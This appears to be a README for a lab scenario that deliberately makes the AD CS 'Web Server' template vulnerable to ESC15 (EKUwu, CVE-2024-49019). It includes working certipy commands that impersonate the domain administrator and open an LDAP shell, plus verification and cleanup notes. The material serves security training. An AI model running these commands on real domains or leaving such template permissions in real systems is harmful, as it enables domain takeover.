# esc15

Adds two ACEs for `<NB>\Domain Users` on the built-in schema v1 `Web Server` template: read and enroll (what `Set-ADCSTemplateACL -Enroll` adds). Schema v1 templates let the requester add arbitrary application policies (EKUwu, CVE-2024-49019).

Attack:

    certipy req -u <user>@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -ca <NB>-CA -template WebServer -upn administrator@<domain> -sid <administrator SID> -application-policies 'Client Authentication'
    certipy auth -pfx administrator.pfx -dc-ip <dc ip> -ldap-shell

How to verify:

    certipy find -u <user>@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -vulnerable -stdout   # ESC15 on WebServer

Disable removes exactly those two ACEs (explicit, Domain Users). Certificates issued from `Web Server` during the scenario stay valid: it is a lab template and its issuance is not revoked.
